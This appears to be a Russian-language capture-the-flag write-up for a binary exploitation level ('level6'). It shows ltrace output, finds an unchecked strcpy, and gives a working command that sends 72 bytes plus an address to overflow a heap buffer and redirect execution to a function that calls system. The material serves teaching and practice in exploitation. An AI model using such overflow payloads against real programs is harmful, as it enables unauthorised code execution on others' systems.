смотрим, где мы оказались и что у нас есть
    ls
    level6

запускам, без аргументов выдает ошибку:
    Segmentation fault (core dumped)
с аргументами тоже:
    Nope

по классике, смотрим с помощью ltrace:

    __libc_start_main(0x804847c, 2, 0xbffff7b4, 0x80484e0, 0x8048550 <unfinished ...>
    malloc(64)                                                              = 0x0804a008
    malloc(4)                                                               = 0x0804a050
    strcpy(0x0804a008, "123")                                               = 0x0804a008
    puts("Nope"Nope
    )                                                            = 5
    +++ exited (status 5) +++

используется strcpy
gdb показывает существование функций n и m, в первой вызывается <system@plt>, необходимая нам
через strcpy сделаем переполнение буфера, чтобы произошел вызов функции n
offset составляет 72 (0x41346341)
не можем действовать, как в предыдущих уровнях, потому что без аргументов получим SegFault
    ./level6 $(python -c 'print "a" * 72 + "\x54\x84\x04\x08"')
